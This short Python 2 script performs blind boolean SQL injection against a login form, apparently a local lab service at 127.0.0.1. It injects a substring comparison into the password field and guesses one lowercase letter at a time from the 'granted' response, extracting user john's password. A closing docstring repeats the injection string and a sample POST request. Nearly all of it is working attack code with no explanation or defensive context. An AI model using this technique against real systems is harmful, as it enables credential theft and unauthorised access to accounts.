from string import ascii_lowercase
import requests

password = ''
for i in xrange(15):
    for c in ascii_lowercase:
        i = str(i)
        password_input = 'pswd\' or substring(password,' + i + ',' + str(1) + ')=\'' + c + '\' and \'1=1'

        # POST variables from Burp Suite Intercept
        payload = {'username': 'john', 'password': password_input}

        r = requests.post('http://127.0.0.1:5000/login', data=payload)
        # print r.text, c, i

        # check if server returned TRUE (access granted)
        if 'granted' in r.text:
            password += c

print password

"""
pswd' or substring(password,1,1)='d' and '1=1

payload = {'key1': 'value1', 'key2': 'value2'}

r = requests.post("http://httpbin.org/post", data=payload)
username=hello&password=sir
"""
